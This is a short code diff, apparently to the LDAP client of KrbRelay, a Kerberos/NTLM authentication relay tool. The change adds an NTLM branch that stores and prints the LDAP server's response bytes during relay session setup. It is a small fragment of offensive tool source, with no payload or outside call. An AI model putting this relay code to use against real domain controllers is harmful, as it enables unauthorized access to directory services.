@@ -36,7 +36,7 @@ namespace KrbRelay.Clients
             if ((LdapStatus)value == LdapStatus.LDAP_SUCCESS)
             {
                 Console.WriteLine("[+] LDAP session established");
-
+                
                 try
                 {
                     if (attacks.Keys.Contains("console"))
@@ -104,8 +104,16 @@ namespace KrbRelay.Clients
                 berval msgidp2 = (berval)Marshal.PtrToStructure(servresp, typeof(berval));
                 byte[] msgidbytes = new byte[msgidp2.bv_len];
                 Marshal.Copy(msgidp2.bv_val, msgidbytes, 0, msgidp2.bv_len);
-                apRep1 = msgidbytes;
-                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+                if (Program.ntlm)
+                {
+                    ntlm2 = msgidbytes;
+                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
+                }
+                else
+                {
+                    apRep1 = msgidbytes;
+                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+                }
             }
         }
 
